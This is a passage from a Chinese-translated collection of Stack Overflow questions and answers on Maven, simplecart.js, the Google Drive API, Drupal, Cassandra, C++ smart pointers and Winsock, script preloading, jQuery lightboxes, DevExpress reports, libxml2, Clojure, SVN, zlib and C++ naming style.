        <arg value="${ant.param2}" />
        <arg value="${ant.param3}" />
        <arg value="${ant.param4}" />
        <arg value="${ant.param5}" />
    </java>
</target>
</configuration> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T03:39:19.160

您可以尝试设置 CLASSPATH 环境变量。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T19:04:30.667

尝试添加

```
<argument>-Xbootclasspath/a:${env.JAVA_HOME}/lib/tools.jar</argument> 
```

从命令行，添加

```
-Dexec.args="-Xbootclasspath/a:$JAVA_HOME/lib/tools.jar" 
```

另一种选择是将 tools.jar 声明为系统依赖项，然后将 exec 插件范围设置为“系统”。请参阅：[exec-maven-plugin - classpathScope](http://mojo.codehaus.org/exec-maven-plugin/java-mojo.html#classpathScope)

# javascript - 将运费和总成本打印到表格

> ID：11735950
> 
> 赞同：0
> 
> 时间：2012-07-31T08:22:28.290
> 
> 标签：javascript, jquery, e-commerce

我正在使用[simplecart.js](http://simplecartjs.org)在我之前创建的网站上建立一个小商店。我有一个问题。只用一行代码显示整个购物车：

`<div class="simpleCart_items"></div>`

并且javascript打印表格，您在源代码中看不到它。但是，在 chrome 中检查元素是我的好朋友，创建的表看起来像这样：

```
<table>
    <tbody>
        <tr class="headerRow">
            <th class="item-name">Tuote</th>
            <th class="item-price">Hinta</th>
            <th class="item-decrement"></th>
            <th class="item-quantity">Määrä</th>
            <th class="item-increment"></th>
            <th class="item-total">Yhteensä</th>
            <th class="item-remove"></th>
        </tr>
        <tr class="itemRow row-0 odd" id="cartItem_SCI-3">
            <td class="item-name">Teipit (Valkoinen hiilikuitu)</td>
            <td class="item-price">€48.00</td>
            <td class="item-decrement">
                <a href="javascript:;" class="simpleCart_decrement">-</a>
            </td>
            <td class="item-quantity">1</td>
            <td class="item-increment">
                <a href="javascript:;" class="simpleCart_increment">+</a>
            </td>
            <td class="item-total">€48.00</td>
            <td class="item-remove">
                <a href="javascript:;" class="simpleCart_remove">Poista</a>
            </td>
        </tr>
    </tbody>
</table> 
```

我希望它打印出这样的东西：

```
<table>
    <tbody>
        <tr class="headerRow">
            <th class="item-name">Tuote</th>
            <th class="item-price">Hinta</th>
            <th class="item-decrement"></th>
            <th class="item-quantity">Määrä</th>
            <th class="item-increment"></th>
            <th class="item-total">Yhteensä</th>
            <th class="item-remove"></th>
        </tr>
        <tr class="itemRow row-0 odd" id="cartItem_SCI-3">
            <td class="item-name">Teipit (Valkoinen hiilikuitu)</td>
            <td class="item-price">€48.00</td>
            <td class="item-decrement">
                <a href="javascript:;" class="simpleCart_decrement">-</a>
            </td>
            <td class="item-quantity">1</td>
            <td class="item-increment">
                <a href="javascript:;" class="simpleCart_increment">+</a>
            </td>
            <td class="item-total">€48.00</td>
            <td class="item-remove">
                <a href="javascript:;" class="simpleCart_remove">Poista</a>
            </td>
        </tr>
        <tr class="shippingtotal" id="shipping">
            <td class="item-name">Shipping</td>
            <td class="shipping-cost">€5.00</td>
            <td class="item-decrement">
                <a href="javascript:;" class="simpleCart_decrement">-</a>
            </td>
            <td class="item-quantity">1</td>
            <td class="item-increment">
                <a href="javascript:;" class="simpleCart_increment">+</a>
            </td>
            <td class="item-total">€48.00</td>
            <td class="item-remove">
                <a href="javascript:;" class="simpleCart_remove">Poista</a>
            </td>
        </tr>
    </tbody>
</table> 
```

所以，这里是 simplecart.js 本身： http: [//pastebin.com/j5VKGkV1](http://pastebin.com/j5VKGkV1)

我认为我应该在这部分代码中添加一些内容：

```
// write out cart
                writeCart: function (selector) {
                    var TABLE = settings.cartStyle.toLowerCase(),
                        isTable = TABLE === 'table',
                        TR = isTable ? "tr" : "div",
                        TH = isTable ? 'th' : 'div',
                        TD = isTable ? 'td' : 'div',
                        cart_container = simpleCart.$create(TABLE),
                        header_container = simpleCart.$create(TR).addClass('headerRow'),
                        container = simpleCart.$(selector),
                        column,
                        klass,
                        label,
                        x,
                        xlen;

                    container.html(' ').append(cart_container);

                    cart_container.append(header_container);

                    // create header
                    for (x = 0, xlen = settings.cartColumns.length; x < xlen; x += 1) {
                        column = cartColumn(settings.cartColumns[x]);
                        klass = "item-" + (column.attr || column.view || column.label || column.text || "cell") + " " + column.className;
                        label = column.label || "";

                        // append the header cell
                        header_container.append(
                        simpleCart.$create(TH).addClass(klass).html(label));
                    }

                    // cycle through the items
                    simpleCart.each(function (item, y) {
                        simpleCart.createCartRow(item, y, TR, TD, cart_container);
                    });

                    return cart_container;
                },

                // generate a cart row from an item
                createCartRow: function (item, y, TR, TD, container) {
                    var row = simpleCart.$create(TR).addClass('itemRow row-' + y + " " + (y % 2 ? "even" : "odd")).attr('id', "cartItem_" + item.id()),
                        j,
                        jlen,
                        column,
                        klass,
                        content,
                        cell;

                    container.append(row);

                    // cycle through the columns to create each cell for the item
                    for (j = 0, jlen = settings.cartColumns.length; j < jlen; j += 1) {
                        column = cartColumn(settings.cartColumns[j]);
                        klass = "item-" + (column.attr || (isString(column.view) ? column.view : column.label || column.text || "cell")) + " " + column.className;
                        content = cartCellView(item, column);
                        cell = simpleCart.$create(TD).addClass(klass).html(content);

                        row.append(cell);
                    }
                    return row;
                }

            }); 
```

但是什么？运费可以这样显示： `<span class="simpleCart_shipping"></span>`我试过在购物车之后添加它，但它看起来有点傻。

更新：这是一个没有 mofication 的示例（之前）： ![前](../Images/6f4e8d2cc24f6c28fe466d10accee45b.png) 这就是它应该是什么样的..

![我需要的](../Images/ed7cfefef711bb59069ab205a6a23b25.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T10:31:10.390

通过添加以下内容开始：

```
 // [..]
    header_container = simpleCart.$create(TR).addClass('headerRow'),

    // Added line
    total_container = simpleCart.$create(TR).addClass('shippingtotal').attr('id', "shipping" ),

    container = simpleCart.$(selector),
    // [..] 
```

和

```
 // create header
    // [..]

    // cycle through the items
    // [..]

    // create total
    cart_container.append(total_container);
    total_container.append( createTotalShippingRow() );   // Even though invoked just once

    return cart_container; 
```

和

```
createCartRow: function (item, y, TR, TD, container) {
    // [..]
},

createCartTotalShippingRow: function() {

    // Impl. look other update
}

createTotalShippingRow: function() {

    // Impl. look other update
} 
```

我会在 impl 上工作。现在 ：-）

将以下内容添加到您的设置中......（来自[http://pastebin.com/j5VKGkV1](http://pastebin.com/j5VKGkV1)）

```
settings = {

    cartTotalColumns: [{
        attr: "name",
        label: "Name"
    }, {
        attr: "price",
        label: "Price",
        view: 'currency'
    }, {
        view: "empty",      // replaces decrement
        label: false
    }, {
        attr: "empty",      // replaces quantity
        label: false        // Qty
    }, {
        view: "empty",      // replaces increment
        label: false
    }, {
        attr: "total",
        label: "SubTotal",
        view: 'currency'
    }, {
        view: "empty",      // replaces remove
//      text: "Remove",
        label: false
    }],
} 
```

更新 [..]
[..removed code from update..]
尝试编写可重用的代码（您想要项目和总计的类似输出）。
试着让这些方法做他们描述的事情（附加在容器之外，你无论如何都返回了该行）。
尝试使用正确的变量名。
尝试区分不同类型的功能。
即使在 writeCart 方法中，您也可以拆分“createHeader(..) createItems(..) createTotal(..)”。

此外，尝试使用语义名称。至少 'y' 变量应该重命名为 'rowIndex' 之类的。

更新：

```
createTotalShippingRow: function( TR, TD ) {

    // I think we shouldn't instantiate the item here, but you could test if this works?
    var item = {
        name: "Shipping",
        price: 5,               
//      view: "empty",      // decrement
//      attr: "empty",      // quantity
//      view: "empty",      // increment
        total: this.total(),
//      view: "empty",      // remove
        };

    var rowid = "shipping";

    return createCartTotalShippingRow( item, rowid, TR, TD );
},

createCartTotalShippingRow: function( item, rowclass, rowid, TR, TD ) {
    var row = simpleCart.$create(TR).addClass( rowclass ).attr( 'id', rowid ),
        i = 0,
        cartTotalColumns = settings.cartTotalColumns,
        ln = cartTotalColumns.length,
        column,
        classname;

    for ( ; i < ln; i++ ) {
        column = cartColumn( cartTotalColumns[ i ] );
        classname = "item-" + ( column.attr || ( isString( column.view ) ? column.view : column.label || column.text || "cell" ) ) + " " + column.className;
        content = cartCellView( item, column );
        cell = simpleCart.$create(TD).addClass(classname).html(content);
        row.append(cell);
    }

    return row;
} 
```

更新：

[整个文件..](http://pastebin.com/FJuM0KEY)但是我遇到了与原始代码相同的错误（方法 create 不存在）。但这与您的请求本身无关。

# python - Drive API 请求中未列出任何 Google Drive 文件

> ID：11735952
> 
> 赞同：5
> 
> 时间：2012-07-31T08:22:31.217
> 
> 标签：python, google-drive-api, google-api-python-client

我正在尝试使用桌面应用程序获取我的 Google Drive 中的文件列表。代码如下：

```
def main(argv):

    storage = Storage('drive.dat')
    credentials = storage.get()

    if credentials is None or credentials.invalid:
        credentials = run(FLOW, storage)

    # Create an httplib2.Http object to handle our HTTP requests and authorize it
    # with our good Credentials.
    http = httplib2.Http()
    http = credentials.authorize(http)

    service = build("drive", "v2", http=http)
    retrieve_all_files(service) 
```

然后在retrieve_all_files 中打印文件：

```
param = {}
if page_token:
    param['pageToken'] = page_token
    files = service.files().list(**param).execute()
    print files 
```

但是在我对我的帐户进行身份验证后，打印的文件列表中没有任何项目。有没有人有类似的问题或知道解决方案？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-31T15:31:02.067

如果我错了，请纠正我，但我相信您使用的是`https://www.googleapis.com/auth/drive.file`范围，它只返回您的应用创建或使用[Google Drive UI](https://developers.google.com/drive/integrate-open#open_files_using_the_open_with_contextual_menu)或[`Picker API`](https://developers.google.com/drive/integrate-open#open_and_upload_files_using_the_google_picker).

要检索所有文件，您需要使用更广泛的范围：`https://www.googleapis.com/auth/drive`.

要了解有关不同范围的更多信息，请查看[文档](https://developers.google.com/drive/scopes)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-04-28T22:19:43.350

一方面，您需要遍历 page_token 以获取 My Drive 的所有内容以及任何子文件夹。还有一些其他的事情可能太像不提供查询等。试试这个：

```
def retrieve_all_files(service):
    """ RETURNS a list of files, where each file is a dictionary containing
        keys: [name, id, parents]
    """

    query = "trashed=false"

    page_token = None
    L = []

    while True:
        response = service.files().list(q=query,
                                             spaces='drive',
                                             fields='nextPageToken, files(id, name, parents)',
                                             pageToken=page_token).execute()
        for file in response.get('files', []):  # The second argument is the default
            L.append({"name":file.get('name'), "id":file.get('id'), "parents":file.get('parents')})

        page_token = response.get('nextPageToken', None)  # The second argument is the default

        if page_token is None:  # The base My Drive folder has None
            break

    return L 
```

# dynamic - 使用规则动态更新 webform 提交的字段

> ID：11735954
> 
> 赞同：0
> 
> 时间：2012-07-31T08:22:31.813
> 
> 标签：dynamic, drupal-7, field, drupal-webform, drupal-rules

我是 drupal 的新手，在创建提交后动态更新 webform 字段的规则方面寻求帮助。我使用 webform 为赞助商创建了一个表单，并在保存到 ubercart 产品进行付款后重定向。现在我必须根据产品（Platinum Sponsorship/Gold Sponsorship）创建规则，并在订单完成时更新赞助字段。我创建了规则，但在将字段（规则操作）赞助商的值设置为（白金/黄金）时卡住了，因为网络表单字段没有出现在数据选择器中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T12:00:38.743

也许您需要[Webform Rules 模块](http://drupal.org/project/webform_rules)。

> 该模块在 Web 表单上添加了规则集成。
> 
> 您是否曾经想使用规则对 Web 表单提交做出反应，但找不到合适的事件？Webform Rules 可以通过规则捕获 webform 提交并做任何你想做的事情（意思是：做任何规则让你做的事情）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-12-19T12:07:34.750

至少，确保您启用了[Webform Rules](https://www.drupal.org/project/webform_rules)模块（如先前答案中所建议的那样）。

但是，您可能还想查看功能请求“[将提交数据公开给规则](https://www.drupal.org/node/2020149)”。以下是它的摘要：

> 目前，除了通过令牌替换或自定义 php 操作外，提交数据不会暴露在规则中。此补丁以“一流”的方式公开提交数据。

问题状态是“需要审查”……但也不是“简单”问题。

解决该问题后，您将能够按照您的要求进行操作。所以现在这是最好的。

# jdbc - Cassandra 如何确保高可用性？

> ID：11735957
> 
> 赞同：1
> 
> 时间：2012-07-31T08:22:39.300
> 
> 标签：jdbc, cassandra, fallback

我想了解 Cassandra 如何确保高可用性。我所知道的是，当我们向 Cassandra 数据库查询数据时，一个名为 coordinator 的节点会将查询路由到集群中具有所需数据的适当 Cassandra 节点。但是，如果我们在 JDBC 连接 URL 中指定的节点（我认为它将充当集群中的协调器，如果我错了，请纠正我）本身关闭了怎么办？在这种情况下，Cassandra 如何确保高可用性？

也许我们作为开发人员必须为此提供回退机制？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T10:15:04.000

在 Cassandra 集群中，所有节点都是平等的。集群级别没有主节点或协调节点。当你连接到一个集群时，你通常会指定一个或多个节点来连接，但是一旦驱动程序连接了它就可以找到其他节点。这意味着如果它连接的第一个节点出现故障，它会知道其他节点并可以连接到其中一个节点。

如果将查询发送到本身不承载请求数据的节点（或指定了高于 1 的一致性级别），则该节点充当查询的协调者，但这是一个临时角色，任何节点都可以任何查询的那个角色。

甚至有驱动程序，例如 Astyanax，它连接到多个节点并尝试找出哪个节点包含请求的数据并使用与该节点的连接来执行查询，以最大限度地减少查询时间。

# c++ - 使用智能指针的访问冲突

> ID：11735958
> 
> 赞同：0
> 
> 时间：2012-07-31T08:22:42.103
> 
> 标签：c++, c++11, access-violation, unique-ptr

**obj->ip = "127.0.0.1";**行有什么问题？? 我在这里遇到访问冲突。

我记得在课堂上 - 你可以使用**私人**成员，不是吗？

```
typedef struct Header
{
    SOCKET sock;
    SOCKADDR_IN addr;
    WORD WSAVersion;
    WSAData data;
    char *ip;
    u_short port;
    int result;
} Header;

class A
{
private:
    std::unique_ptr<Header> obj;

public:
    A(void)
    {
        obj(new Header);
        obj->ip = "127.0.0.1"; // here comes the error!
    }

    ~A(void)
    {
        obj.release();
    }
};

int main(void)
{
    std::unique_ptr<A> handler(new A); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T03:34:35.270

`obj(new Header);`在构造函数主体中是无意义的，并且您正在泄漏内存（完全违背了首先使用智能指针的目的） - 尝试以下操作：

```
class A
{
    std::unique_ptr<Header> obj;

public:
    A() : obj(new Header()) // value-initialize object, not default-initialize
    {
        obj->ip = "127.0.0.1";
    }
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T06:36:11.813

谢谢你们的帮助，伙计们！我已经编辑了我的源代码，现在它运行良好且没有违规，它确实连接到远程主机：

```
#include <iostream>
#include <memory>
#include <WinSock2.h>
#pragma comment(lib, "Ws2_32.lib")
typedef struct Header
{
    SOCKET sock;
    SOCKADDR_IN addr;
    WORD WSAVersion;
    WSAData data;
    char *ip;
    u_short port;
    int result;
} Header;
class Connector
{
private:
    std::unique_ptr<Header> obj;
public:
    Connector(void)
    {
        obj.reset(new Header);
        obj->ip = "193.201.231.44";
        obj->port = 2775;
        obj->WSAVersion = 0x202;
        obj->addr.sin_family = AF_INET;
        obj->addr.sin_addr.s_addr = inet_addr(obj->ip);
        obj->addr.sin_port = htons(obj->port);
        this->MakeConnection(&obj);
    }
    ~Connector(void)
    {
        obj.release();
    }
    int MakeConnection(std::unique_ptr<Header> *pointer)
    {
        (*pointer)->result = WSAStartup((*pointer)->WSAVersion, &(*pointer)->data);
        if((*pointer)->result != NO_ERROR)
        {
            std::cout << "WSA failed to start with the error: " << std::endl << (*pointer)->result << std::endl;
            return 0;
        }
        else
        {
            std::cout << "WSA started successfully" << std::endl;
            (*pointer)->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if((*pointer)->sock == SOCKET_ERROR)
            {
                std::cout << "Failed to init new socket, with the error: " << WSAGetLastError() << std::endl;
                return 0;
            }
            else
            {
                (*pointer)->result = connect(obj->sock, (sockaddr*)&(*pointer)->addr, sizeof((*pointer)->addr));
                if((*pointer)->result == SOCKET_ERROR)
                {
                    std::cout << "Failed to connect to the remote host " << (*pointer)->ip << ":" << (*pointer)->port
                        << ", with the error: " << WSAGetLastError() << std::endl;
                    return 0;
                }
                else
                {
                    std::cout << "Connected to the remote host " << (*pointer)->ip << ":" << (*pointer)->port << std::endl;
                    return 1;
                }
            }
        }
    }
};
void init(void)
{
    std::unique_ptr<Connector> obj;
    obj.reset(new Connector);
    obj.release();
}
int main(void)
{
    init();
    return 0;
} 
```

# php - 优化 JavaScript CSS 下载

> ID：11735960
> 
> 赞同：12
> 
> 时间：2012-07-31T08:23:02.613
> 
> 标签：php, javascript, jquery, css

我的网站有许多页面都使用 jQuery 和 JSON 以及相同的 CSS，除了少数页面。第一个页面是用户登录。由于用户需要花时间输入他的用户名和密码，我想在登录期间下载整个用户会话所需的所有 JavaScript 和 CSS 文件。如何才能做到这一点？所有页面的标题都相同。我该如何优化它？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-07-31T08:31:41.697

我的想法是在 .js 之后动态加载 js 和 css 文件`document.load`。这不会影响登录页面的加载时间，同时还会在用户登录后缓存您的 js 和 css 文件。

`document.ready`如果它为您加载更快，您也可以轻松地将其更改为。

这样的事情呢？

```
$(document).load(function() {
    function preloadFile(filename, filetype){

        //For javascript files
        if (filetype=="js"){
            var fileref=document.createElement('script');
            fileref.setAttribute("type","text/javascript");
            fileref.setAttribute("src", filename);
        }

        //For CSS files
        else if (filetype=="css") {
            var fileref=document.createElement("link");
            fileref.setAttribute("rel", "stylesheet");
            fileref.setAttribute("type", "text/css");
            fileref.setAttribute("href", filename);
        }

        document.getElementsByTagName("head")[0].appendChild(fileref)
    }

    //Examples of how to use below
    preloadFile("myscript.js", "js"); 
    preloadFile("javascript.php", "js");
    preloadFile("mystyle.css", "css");
}); 
```

参考

[http://www.javascriptkit.com/javatutors/loadjavascriptcss.shtml](http://www.javascriptkit.com/javatutors/loadjavascriptcss.shtml)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-07-31T08:28:53.477

*   在您的登录页面上添加您所有的 css/javascript。
*   将所有的 CSS 放在 HEAD 部分的顶部。
*   将所有 Javascript 放在底部。
*   还将您的 Javascript 和 CSS 作为外部文件，因为它们被浏览器缓存（而不是在页面中编写内联 javascript 和 css）。

*   缩小你的 Javascript 和 CSS

**更新 2**

也可以使用[YUI GET UTILITY来完成 JS 和 CSS 的后加载](http://developer.yahoo.com/yui/get/)

有关更多详细信息，请查看此[Yahoo：优化网站的最佳实践](http://developer.yahoo.com/performance/rules.html/)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-07-31T08:25:13.210

> 我想在登录期间为整个用户会话下载所有必需的 javascript 和 css 文件

```
<title>Login</title>
<script src="foo.js"></script> <!-- This line might be better placed just before </body> -->
<link rel="stylesheet" type="text/css" href="foo.css"> 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-07-31T08:34:16.000

我推荐一个异步加载器，例如requireJS。

创建并压缩 javascript 和 css 后，将其加载分配给一个事件，例如当用户关注用户名字段时。

Facebook 在他们的预输入查询中使用了类似的技巧：当搜索框获得焦点时加载与用户相关的数据。

# javascript - jquery的多个.load()事件冲突

> ID：11735961
> 
> 赞同：4
> 
> 时间：2012-07-31T08:23:06.453
> 
> 标签：javascript, jquery

我已经用`$('#result').load('test.php')`文件加载了数据，这是完全正常的。

这是`test.php`屏幕截图 ![在此处输入图像描述](../Images/dbfe26f2634842929e3591d1814a7a85.png)

现在这是我在灯箱中加载的文件： ![在此处输入图像描述](../Images/2f422a3462fe1904b696fbdebd0326c4.png)

在我的`test.php`文件中，我还通过点击事件在灯箱中加载了另一个文件。灯箱与新加载的文件一起正确显示。这是调用灯箱的代码：

```
jQuery('#wt_opp_coll .coun').click(function(){
        jQuery(this).jpLightBox({
            width: 500,
            height: 250,
            url: 'components/content/test_file.php'
            //message: 'Just Testing the file'
        });
    }); 
```

有了这个，我新加载的文件`test_file.php`在灯箱中显示得很好，但我最后加载的文件`test.php`在灯箱上消失了，正如您在第二个屏幕截图中看到的那样，只有灯箱出现，而不是像第一个屏幕截图那样在背景中显示细节。

请帮助我停止消失我最后加载的文件（`test.php`）。

**注意：**我还使用`.load()`lightbox 中的函数来加载 url。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:54:17.050

我没有对 LightBox 做任何事情，但问题可能是您要更换`#wt_opp_coll .coun`新的灯箱吗？

```
jQuery('#wt_opp_coll .coun').click(function(){
        jQuery(this).jpLightBox({
            width: 500,
            height: 250,
            url: 'components/content/test_file.php'
            //message: 'Just Testing the file'
        });
    }); 
```

第二行具有`jQuery(this)`向 parent 指示`#wt_opp_coll .coun`。所以我认为正在发生的是灯箱正在取代`#wt_opp_coll .coun`内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-05T06:09:57.880

我不能告诉你是什么导致了这个奇怪的问题，但我前段时间也遇到了问题。我解决它的方法是使用 livequery 来处理我的点击事件。不要问我为什么，我已经浏览了几个小时的库和文档，并试图从其他人那里找到答案但无济于事。

试一试，如果您使用 livequery 没有问题，它可能是您的解决方案。

这是我的代码片段，它用于多达 50 个不同的加载调用实例，所有这些实例都有效。有些链接也是由其他加载的数据动态创建的。

```
function ajaxContent(link, sel, reg, extReg) {
$(sel).not(link).removeClass("active");
$(link).addClass("active");

var toLoad = $(link).attr('href')+ ' ' + extReg;

$(reg).fadeOut('slow',loadContent);

function loadContent() {
    $(reg).load(toLoad,'',showNewContent())
}

function showNewContent() {
    $(reg).delay(200).fadeIn('slow');
}

}

$(document).ready(function() {

// Top left "main" nav
$('#jax-nav li a').livequery("click", function(event) {
    ajaxContent(event.target, '#jax-nav li a', '#page-content', '#ajax-out');
    return false;
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-05T07:22:42.290

尝试在您的 html 上为灯箱放置一个空 div

```
<div id="lightBoxDiv"></div> 
```

并编辑您的代码

```
jQuery('#wt_opp_coll .coun').click(function(){
        jQuery("#lightBoxDiv").jpLightBox({
            width: 500,
            height: 250,
            url: 'components/content/test_file.php'
            //message: 'Just Testing the file'
        });
    }); 
```

您还需要在关闭按钮上刷新此 div 的内容，否则它将影响您的基本 html

将此代码放在关闭按钮中

```
$("#lightBoxDiv").html(''); 
```

# asp.net - DevExpress：带有 WebForms 和实体框架的 XtraGrid

> ID：11735965
> 
> 赞同：2
> 
> 时间：2012-07-31T08:23:23.630
> 
> 标签：asp.net, entity-framework, webforms, devexpress, xtrareport

截至今天，我对 XtraReports（以及一般的 DevExpress）完全陌生。我有 2 天的时间来实施报告，所以请善待并提供详尽的解释。

我必须处理的是：

1.  网络表单 (.NET 4)
2.  实体框架（edmx，不是 Code First）
3.  我创建了一个报告（继承 DevExpress.XtraReports.UI.XtraReport）
4.  目前报告中没有字段，因为我不知道如何将其绑定到我的实体..

我确实找到了一个有人这样做的网站：

```
NorthwindEntities entities = new NorthwindEntities();
report.DataSource = entities.Categories; 
```

我尝试在构造函数中这样做：

```
 this.DataSource = context.Tenants.ToList(); 
```

但即使我可以看到有 8 条记录，报告也没有显示任何内容。我猜我需要创建一些控件并绑定它们。有没有人有这种情况的一些工作代码？

**编辑**

如果有人问.. 是的，我已经到处搜索了一个例子，包括这里： [http](http://documentation.devexpress.com/#XtraReports/CustomDocument9814) ://documentation.devexpress.com/#XtraReports/CustomDocument9814 。该站点确实显示了如何绑定到数据集..但我不知道如何使用实体框架代替它...这就是我在这里问的原因...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T09:00:12.477

这有效： http: [//www.devexpress.com/Support/Center/p/Q334667.aspx](http://www.devexpress.com/Support/Center/p/Q334667.aspx)

显然，您可以将 bindingSource 拖到那里，但您需要在设计器中添加一行额外的代码。就我而言：

```
this.bindingSource.DataSource = typeof(Tenant); 
```

现在我可以看到填充了该类的所有属性的字段列表，并且可以将字段拖放到设计器上。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:31:24.177

我们也使用 XtraReports，但在 winform 解决方案中，所以我不知道一切是否完全相同。

假设您在项目中添加了 xtraReport 文件，就像我们在其中一个项目中所做的那样，您可以在设计时而不是运行时设置数据源。为此，请打开报告并查看属性窗口。当您这样做时，您可以从 Visual Studio 的字段窗口中选择字段或完整的表格并将其添加到您的报告中。假设您不希望用户能够设计报告，您也可以在此处执行此操作。

根据我的经验，尽管创建一个单独的 edmx 文件是明智的，该文件只包含您要为报告显示的数据。devexpress 处理数据的方式是在过滤数据之前检索所有数据，对于大型数据集，这可能需要一段时间。

# makefile - 可以创建一个共享的libxml2

> ID：11735969
> 
> 赞同：0
> 
> 时间：2012-07-31T08:23:36.680
> 
> 标签：makefile, android-ndk, java-native-interface, libxml2

我正在使用 ndk 和 jni 在 android 中创建一个应用程序。在我的应用程序中，我需要解析 xml 数据。为此，我使用了 libxml2。

当我制作 libxml2 的静态库并使用时，它工作正常。

但是当我尝试创建一个共享库并在我的应用程序中使用它时，我在执行 ndk-build 时遇到错误：

```
undefined reference to `xmlReaderForMemory'
/home/subrat/EclipseIDE/workspace/jni/source/interface.c:677: undefined reference to `xmlTextReaderRead'
/home/subrat/EclipseIDE/workspace/jni/source/interface.c:680: undefined reference to `xmlTextReaderNodeType'
....... 
```

所以任何人都可以告诉我我的编码是否有任何问题，或者我无法制作 libxml2 的共享库。

任何类型的建议表示赞赏............

# clojure - 创建另一个 Clojure 命名空间的别名

> ID：11735970
> 
> 赞同：5
> 
> 时间：2012-07-31T08:23:48.103
> 
> 标签：clojure, namespaces

我在一个命名空间中有一些私有函数，我想将它们包含在第二个命名空间中。例如

```
(ns one)

(defn ^:private foo 
  "A docstring"
  [x] (* x 2)) 
```

第二个命名空间需要为此创建一个别名：

```
(ns two)

(def foo ???)

(foo 3)   ;; should work as if the function in namespace one was called
=> 6 
```

理想情况下，我想保留文档字符串，这样我就不必在两个地方维护它。此外，我希望可以选择使用相同的名称或不同的名称。

此要求的原因如下：在 namespace 中需要/使用该功能`one`。`one`是 的依赖项`two`，并且由于我们不能有循环依赖项，因此无法在其`foo`内部定义`two`。`two`是公共 API，因此`foo`需要成为`two`命名空间的公共部分。

实现这一目标的最佳方法是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-28T15:31:04.413

这个怎么样：

```
(ns one)

(defn- foo 
  "A docstring"
  [x] (* x 2))

(ns two)

(def foo-alias #'one/foo)
(alter-meta! #'foo-alias merge (select-keys (meta #'one/foo) [:doc :arglists])) 
```

诀窍是不解析符号'one/foo，从而避免触发其元数据上的私有标志。然后在您的第二个命名空间中为 foo 起别名后，您只需从先前的定义中挑选您想要保留的元数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-21T14:41:29.473

Potemkin 库有这种功能`import-vars`。

[https://github.com/ztellman/potemkin](https://github.com/ztellman/potemkin)

# svn - SSL 握手失败：SSL 错误：收到了非法版本的记录包

> ID：11735971
> 
> 赞同：1
> 
> 时间：2012-07-31T08:23:49.527
> 
> 标签：svn, error-handling, jenkins

在我的 Linux 机器上执行 SVN 操作时出现以下错误。

```
svn info https://<my_svn_repo> 
```

错误：

> svn：'https://'的选项：SSL 握手失败：SSL 错误：收到了非法版本的记录包。(https://)**

但是在同一台服务器上使用 jenkins（仅）我能够从同一存储库中签出代码。从我的本地（Windows）系统中，我能够完成所有活动。

# objective-c - Xcode中的Zlib使用objective c

> ID：11735972
> 
> 赞同：0
> 
> 时间：2012-07-31T08:23:53.000
> 
> 标签：objective-c, osx-lion

我[将此链接](http://www.clintharris.net/2009/how-to-gzip-data-in-memory-using-objective-c/) 用作我的 CDTest.h 和 CDTest.m 并在我的 TestAppDelegate.mi 中使用按钮操作调用这些类

```
-(IBAction)Zipbtn:(id)sender{

    NSArray* paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSLog(@"paths=%@",paths);
    NSString* dPath = [paths objectAtIndex:0];
    NSLog(@"dpaths=%@",dPath);

    NSString* txtfile = [dPath stringByAppendingPathComponent:@"test.txt"];
    NSLog(@"txtfile=%@",txtfile);

    NSData* data=[txtfile dataUsingEncoding:NSUTF8StringEncoding];
     NSLog(@"data=%@",data);

   CDTest *obj=[[CDTest alloc]init];
    [obj gzipData:data];

} 
```

但显示

> 警告实例方法 -gzipData not found also on button click shows :-[CDTest gzipData:]: unrecognized selector sent to instance 0x7f8d7a009070 请帮帮我，因为我是 Mac osx 的新手。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T09:51:23.397

该方法是类方法 - 不是实例方法。你应该使用：

```
[CDTest gzipData:data] 
```

此外，您实际上是在执行以下操作时从字符串创建 NSData：

```
NSData* data=[txtfile dataUsingEncoding:NSUTF8StringEncoding]; 
```

您要做的是从文件的内容中获取数据，即：

```
NSData *data = [NSData dataWithContentsOfFile:txtfile]; 
```

# c++ - c++ setter 编码约定。输入变量名应该是什么？

> ID：11735978
> 
> 赞同：2
> 
> 时间：2012-07-31T08:24:28.957
> 
> 标签：c++, coding-style

我尝试遵循[google c++ style guide](http://google-styleguide.googlecode.com/svn/trunk/cppguide.xml)。我有一个私人成员的二传手 - 年龄。

我的问题是 setAge 参数的名称应该是什么？在 java 中，我使用 this 关键字在它们之间具有相同的名称和区分。

```
void setAge(int age){
     this.age = age;
} 
```

在 c++ 中执行此操作的编码风格是什么（首选谷歌编码风格）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:43:38.647

google C++ 编码标准建议您[在类数据成员后面添加一个下划线](http://google-styleguide.googlecode.com/svn/trunk/cppguide.xml?showone=Variable_Names#Variable_Names)。我认为遵循这一点非常重要，否则您可以保证隐藏具有局部变量名称的类数据成员。

关于 getter 和 setter，我个人觉得`getX`和`setX`conconciton 很乏味，当方法的作用很明显时。

```
int age() const; // gets age, what else could it do?

void age(int age); // sets age, following the principle of least surprise. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T08:28:52.727

